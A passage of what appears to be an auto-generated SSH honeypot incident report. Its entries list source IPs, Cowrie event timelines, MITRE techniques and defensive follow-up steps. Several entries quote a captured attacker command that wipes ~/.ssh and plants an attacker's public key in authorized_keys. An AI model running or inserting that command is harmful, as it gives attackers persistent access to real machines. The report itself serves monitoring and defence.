| `2026-04-14 17:36:22` | `cowrie.session.connect` |
| `2026-04-14 17:36:22` | `cowrie.client.version` |
| `2026-04-14 17:36:22` | `cowrie.client.kex` |
| `2026-04-14 17:36:22` | `cowrie.login.success` |
| `2026-04-14 17:36:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.163.127[.]183` to AbuseIPDB if not already reported
- [ ] Block `43.163.127[.]183` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-02e40eea3274

| Field | Detail |
|---|---|
| **Source IP** | `103.23.198[.]86` |
| **First Seen** | 2026-04-14 17:36 |
| **Last Seen** | 2026-04-14 17:36 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 17:36:38` | `cowrie.session.connect` |
| `2026-04-14 17:36:38` | `cowrie.client.version` |
| `2026-04-14 17:36:38` | `cowrie.client.kex` |
| `2026-04-14 17:36:39` | `cowrie.login.success` |
| `2026-04-14 17:36:40` | `cowrie.session.params` |
| `2026-04-14 17:36:40` | `cowrie.command.input` |
| `2026-04-14 17:36:40` | `cowrie.command.failed` |
| `2026-04-14 17:36:40` | `cowrie.log.closed` |
| `2026-04-14 17:36:40` | `cowrie.session.params` |
| `2026-04-14 17:36:40` | `cowrie.command.input` |
| `2026-04-14 17:36:41` | `cowrie.session.file_download` |
| `2026-04-14 17:36:41` | `cowrie.log.closed` |
| `2026-04-14 17:36:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.23.198[.]86` to AbuseIPDB if not already reported
- [ ] Block `103.23.198[.]86` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-052ea7c6196e

| Field | Detail |
|---|---|
| **Source IP** | `103.23.198[.]86` |
| **First Seen** | 2026-04-14 17:36 |
| **Last Seen** | 2026-04-14 17:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 17:36:43` | `cowrie.session.connect` |
| `2026-04-14 17:36:43` | `cowrie.client.version` |
| `2026-04-14 17:36:44` | `cowrie.client.kex` |
| `2026-04-14 17:36:45` | `cowrie.login.success` |
| `2026-04-14 17:36:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.23.198[.]86` to AbuseIPDB if not already reported
- [ ] Block `103.23.198[.]86` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9db208791e69

| Field | Detail |
|---|---|
| **Source IP** | `118.193.33[.]228` |
| **First Seen** | 2026-04-14 17:37 |
| **Last Seen** | 2026-04-14 17:37 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 17:37:17` | `cowrie.session.connect` |
| `2026-04-14 17:37:17` | `cowrie.client.version` |
| `2026-04-14 17:37:17` | `cowrie.client.kex` |
| `2026-04-14 17:37:18` | `cowrie.login.success` |
| `2026-04-14 17:37:18` | `cowrie.session.params` |
| `2026-04-14 17:37:18` | `cowrie.command.input` |
| `2026-04-14 17:37:18` | `cowrie.command.failed` |
| `2026-04-14 17:37:18` | `cowrie.log.closed` |
| `2026-04-14 17:37:18` | `cowrie.session.params` |
| `2026-04-14 17:37:18` | `cowrie.command.input` |
| `2026-04-14 17:37:18` | `cowrie.session.file_download` |
| `2026-04-14 17:37:18` | `cowrie.log.closed` |
| `2026-04-14 17:37:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.193.33[.]228` to AbuseIPDB if not already reported
- [ ] Block `118.193.33[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-71fce132bcc5

| Field | Detail |
|---|---|
| **Source IP** | `118.193.33[.]228` |
| **First Seen** | 2026-04-14 17:37 |
| **Last Seen** | 2026-04-14 17:37 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 17:37:20` | `cowrie.session.connect` |
| `2026-04-14 17:37:20` | `cowrie.client.version` |
| `2026-04-14 17:37:20` | `cowrie.client.kex` |
| `2026-04-14 17:37:21` | `cowrie.login.success` |
| `2026-04-14 17:37:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.193.33[.]228` to AbuseIPDB if not already reported
- [ ] Block `118.193.33[.]228` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fbf6566260aa

| Field | Detail |
|---|---|
| **Source IP** | `38.19.156[.]18` |
| **First Seen** | 2026-04-14 17:38 |
| **Last Seen** | 2026-04-14 17:38 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 17:38:43` | `cowrie.session.connect` |
| `2026-04-14 17:38:43` | `cowrie.client.version` |
| `2026-04-14 17:38:44` | `cowrie.client.kex` |
| `2026-04-14 17:38:45` | `cowrie.login.success` |
| `2026-04-14 17:38:46` | `cowrie.session.params` |
| `2026-04-14 17:38:46` | `cowrie.command.input` |
| `2026-04-14 17:38:46` | `cowrie.command.failed` |
| `2026-04-14 17:38:46` | `cowrie.log.closed` |
| `2026-04-14 17:38:47` | `cowrie.session.params` |
| `2026-04-14 17:38:47` | `cowrie.command.input` |
| `2026-04-14 17:38:47` | `cowrie.session.file_download` |
| `2026-04-14 17:38:47` | `cowrie.log.closed` |
| `2026-04-14 17:38:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.19.156[.]18` to AbuseIPDB if not already reported
- [ ] Block `38.19.156[.]18` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b9490e23aecc

| Field | Detail |
|---|---|
| **Source IP** | `38.19.156[.]18` |
| **First Seen** | 2026-04-14 17:38 |
| **Last Seen** | 2026-04-14 17:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 17:38:50` | `cowrie.session.connect` |
| `2026-04-14 17:38:50` | `cowrie.client.version` |
| `2026-04-14 17:38:51` | `cowrie.client.kex` |
| `2026-04-14 17:38:52` | `cowrie.login.success` |
| `2026-04-14 17:38:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.19.156[.]18` to AbuseIPDB if not already reported
- [ ] Block `38.19.156[.]18` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-902750364f44

| Field | Detail |
|---|---|
| **Source IP** | `118.193.33[.]228` |
| **First Seen** | 2026-04-14 17:38 |
| **Last Seen** | 2026-04-14 17:39 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 17:38:57` | `cowrie.session.connect` |
| `2026-04-14 17:38:57` | `cowrie.client.version` |
| `2026-04-14 17:38:57` | `cowrie.client.kex` |
| `2026-04-14 17:38:57` | `cowrie.login.success` |
| `2026-04-14 17:38:58` | `cowrie.session.params` |
| `2026-04-14 17:38:58` | `cowrie.command.input` |
| `2026-04-14 17:38:58` | `cowrie.command.failed` |
| `2026-04-14 17:38:58` | `cowrie.log.closed` |
| `2026-04-14 17:38:58` | `cowrie.session.params` |
| `2026-04-14 17:38:58` | `cowrie.command.input` |
| `2026-04-14 17:38:58` | `cowrie.session.file_download` |
| `2026-04-14 17:38:58` | `cowrie.log.closed` |
| `2026-04-14 17:39:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.193.33[.]228` to AbuseIPDB if not already reported
- [ ] Block `118.193.33[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-74156ea005bf

| Field | Detail |
|---|---|
| **Source IP** | `118.193.33[.]228` |
| **First Seen** | 2026-04-14 17:39 |
| **Last Seen** | 2026-04-14 17:39 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 17:39:00` | `cowrie.session.connect` |
| `2026-04-14 17:39:00` | `cowrie.client.version` |
| `2026-04-14 17:39:00` | `cowrie.client.kex` |
| `2026-04-14 17:39:00` | `cowrie.login.success` |
| `2026-04-14 17:39:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.193.33[.]228` to AbuseIPDB if not already reported
- [ ] Block `118.193.33[.]228` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6fb43968acf5

| Field | Detail |
|---|---|
| **Source IP** | `103.146.159[.]14` |
| **First Seen** | 2026-04-14 17:39 |
| **Last Seen** | 2026-04-14 17:39 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 17:39:38` | `cowrie.session.connect` |
| `2026-04-14 17:39:38` | `cowrie.client.version` |
| `2026-04-14 17:39:38` | `cowrie.client.kex` |
| `2026-04-14 17:39:39` | `cowrie.login.success` |
| `2026-04-14 17:39:39` | `cowrie.session.params` |
| `2026-04-14 17:39:39` | `cowrie.command.input` |
| `2026-04-14 17:39:39` | `cowrie.command.failed` |
| `2026-04-14 17:39:39` | `cowrie.log.closed` |
| `2026-04-14 17:39:40` | `cowrie.session.params` |
| `2026-04-14 17:39:40` | `cowrie.command.input` |
| `2026-04-14 17:39:40` | `cowrie.session.file_download` |
| `2026-04-14 17:39:40` | `cowrie.log.closed` |
| `2026-04-14 17:39:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.146.159[.]14` to AbuseIPDB if not already reported
- [ ] Block `103.146.159[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b0b620ad1836

| Field | Detail |
|---|---|
| **Source IP** | `103.146.159[.]14` |
| **First Seen** | 2026-04-14 17:39 |
| **Last Seen** | 2026-04-14 17:39 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 17:39:41` | `cowrie.session.connect` |
| `2026-04-14 17:39:41` | `cowrie.client.version` |
| `2026-04-14 17:39:42` | `cowrie.client.kex` |
| `2026-04-14 17:39:42` | `cowrie.login.success` |
| `2026-04-14 17:39:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.146.159[.]14` to AbuseIPDB if not already reported
- [ ] Block `103.146.159[.]14` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3d0714280ac3

| Field | Detail |
|---|---|
| **Source IP** | `43.163.127[.]183` |
| **First Seen** | 2026-04-14 17:39 |
| **Last Seen** | 2026-04-14 17:39 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 17:39:42` | `cowrie.session.connect` |
| `2026-04-14 17:39:42` | `cowrie.client.version` |
| `2026-04-14 17:39:43` | `cowrie.client.kex` |
| `2026-04-14 17:39:43` | `cowrie.login.success` |
| `2026-04-14 17:39:43` | `cowrie.session.params` |
| `2026-04-14 17:39:43` | `cowrie.command.input` |
| `2026-04-14 17:39:43` | `cowrie.command.failed` |
| `2026-04-14 17:39:43` | `cowrie.log.closed` |
| `2026-04-14 17:39:43` | `cowrie.session.params` |
| `2026-04-14 17:39:43` | `cowrie.command.input` |
| `2026-04-14 17:39:43` | `cowrie.session.file_download` |
| `2026-04-14 17:39:43` | `cowrie.log.closed` |
| `2026-04-14 17:39:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.163.127[.]183` to AbuseIPDB if not already reported
- [ ] Block `43.163.127[.]183` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1b095917e824

| Field | Detail |
|---|---|
| **Source IP** | `43.163.127[.]183` |
| **First Seen** | 2026-04-14 17:39 |
| **Last Seen** | 2026-04-14 17:39 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 17:39:45` | `cowrie.session.connect` |
| `2026-04-14 17:39:45` | `cowrie.client.version` |
| `2026-04-14 17:39:45` | `cowrie.client.kex` |
| `2026-04-14 17:39:45` | `cowrie.login.success` |
| `2026-04-14 17:39:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.163.127[.]183` to AbuseIPDB if not already reported
- [ ] Block `43.163.127[.]183` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b3551e098705

| Field | Detail |
|---|---|
| **Source IP** | `118.193.33[.]228` |
| **First Seen** | 2026-04-14 17:40 |
| **Last Seen** | 2026-04-14 17:40 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 17:40:38` | `cowrie.session.connect` |
| `2026-04-14 17:40:38` | `cowrie.client.version` |
| `2026-04-14 17:40:38` | `cowrie.client.kex` |
| `2026-04-14 17:40:39` | `cowrie.login.success` |
| `2026-04-14 17:40:39` | `cowrie.session.params` |
| `2026-04-14 17:40:39` | `cowrie.command.input` |
| `2026-04-14 17:40:39` | `cowrie.command.failed` |
| `2026-04-14 17:40:39` | `cowrie.log.closed` |
| `2026-04-14 17:40:39` | `cowrie.session.params` |
| `2026-04-14 17:40:39` | `cowrie.command.input` |
| `2026-04-14 17:40:39` | `cowrie.session.file_download` |
| `2026-04-14 17:40:39` | `cowrie.log.closed` |
| `2026-04-14 17:40:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.193.33[.]228` to AbuseIPDB if not already reported
- [ ] Block `118.193.33[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-21b9288f9594

| Field | Detail |
|---|---|
| **Source IP** | `118.193.33[.]228` |
| **First Seen** | 2026-04-14 17:40 |
| **Last Seen** | 2026-04-14 17:40 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 17:40:41` | `cowrie.session.connect` |
| `2026-04-14 17:40:41` | `cowrie.client.version` |
| `2026-04-14 17:40:41` | `cowrie.client.kex` |
| `2026-04-14 17:40:42` | `cowrie.login.success` |
| `2026-04-14 17:40:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.193.33[.]228` to AbuseIPDB if not already reported
- [ ] Block `118.193.33[.]228` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fb9f73198cfd

| Field | Detail |
|---|---|
| **Source IP** | `43.163.127[.]183` |
| **First Seen** | 2026-04-14 17:41 |
| **Last Seen** | 2026-04-14 17:41 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 17:41:27` | `cowrie.session.connect` |
| `2026-04-14 17:41:27` | `cowrie.client.version` |
| `2026-04-14 17:41:28` | `cowrie.client.kex` |
| `2026-04-14 17:41:28` | `cowrie.login.success` |
| `2026-04-14 17:41:28` | `cowrie.session.params` |
| `2026-04-14 17:41:28` | `cowrie.command.input` |
| `2026-04-14 17:41:28` | `cowrie.command.failed` |
| `2026-04-14 17:41:28` | `cowrie.log.closed` |
| `2026-04-14 17:41:28` | `cowrie.session.params` |
| `2026-04-14 17:41:28` | `cowrie.command.input` |
| `2026-04-14 17:41:28` | `cowrie.session.file_download` |
| `2026-04-14 17:41:28` | `cowrie.log.closed` |
| `2026-04-14 17:41:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.163.127[.]183` to AbuseIPDB if not already reported
- [ ] Block `43.163.127[.]183` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0e84b1e53816

| Field | Detail |
|---|---|
| **Source IP** | `43.163.127[.]183` |
| **First Seen** | 2026-04-14 17:41 |
| **Last Seen** | 2026-04-14 17:41 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 17:41:30` | `cowrie.session.connect` |
| `2026-04-14 17:41:30` | `cowrie.client.version` |
| `2026-04-14 17:41:30` | `cowrie.client.kex` |
| `2026-04-14 17:41:30` | `cowrie.login.success` |
| `2026-04-14 17:41:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.163.127[.]183` to AbuseIPDB if not already reported
- [ ] Block `43.163.127[.]183` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-af12d0e16667

| Field | Detail |
|---|---|
| **Source IP** | `103.23.198[.]86` |
| **First Seen** | 2026-04-14 17:41 |
| **Last Seen** | 2026-04-14 17:41 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
